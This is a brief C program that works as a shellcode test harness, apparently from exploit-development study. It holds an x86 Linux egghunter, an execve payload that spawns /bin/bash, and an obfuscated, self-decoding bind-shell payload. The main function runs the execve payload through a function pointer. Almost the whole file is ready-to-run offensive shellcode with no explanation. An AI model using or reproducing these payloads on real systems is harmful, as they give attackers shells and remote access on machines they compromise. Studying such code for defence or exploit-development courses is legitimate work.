#include<stdio.h>
#include<string.h>


//execve shellcode
unsigned char egghunter[]=\
"\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";

unsigned char code[] = \
"\x90\x50\x90\x50\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

//encrypted bind shell
unsigned char code1[]=\
"\xeb\x30\x5e\x31\xc0\x80\x3e\xdd\x74\x2d\x8a\x06\x86\x46\x01\x88\x06\x80\x36\x98\x80\x36\x19\x80\x36\x08\x80\x36\x02\x80\x76\x01\x98\x80\x76\x01\x19\x80\x76\x01\x08\x80\x76\x01\x02\x83\xc6\x02\xeb\xd3\xe8\xcb\xff\xff\xff\x50\xba\x68\x7c\xc8\xd8\xe1\xd8\x02\x89\x3b\x6a\x46\xed\xd0\x0b\xd9\xd5\x89\xe3\x9a\x8b\xe1\xd7\xda\x9b\x02\xdb\xe1\x6a\xd3\xed\x0b\x46\xca\x02\x38\x8f\x3b\x8f\x46\xed\xc8\x0b\xed\x3b\x0b\x46\xd2\x18\xb4\xe1\x46\xd3\xc2\x0b\x73\xf2\xa4\xe3\xf8\xa4\xe3\xe3\xe9\xa4\xe5\xe2\x68\x02\xd8\xdb\x6a\x02\x80\x3b\x0b\x46\xdd";

main()
{printf("Shellcode Length:  %d\n", strlen(egghunter));

int (*ret)() = (int(*)())code;


ret();}